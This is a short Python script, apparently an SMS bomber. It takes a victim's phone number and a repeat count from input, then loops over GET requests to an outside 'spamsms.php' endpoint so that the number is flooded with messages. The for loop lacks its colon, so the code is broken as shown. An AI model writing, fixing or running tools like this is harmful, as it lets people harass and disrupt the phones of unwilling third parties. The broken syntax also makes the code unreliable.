import requests

nomor = input ("nomor = ")
jumlah = int(input("jumlah = "))
for i in range(jumlah)
    url = requests.get(f"https://darkteam.my.id/minispam/spamsms.php?nomor={nomor}")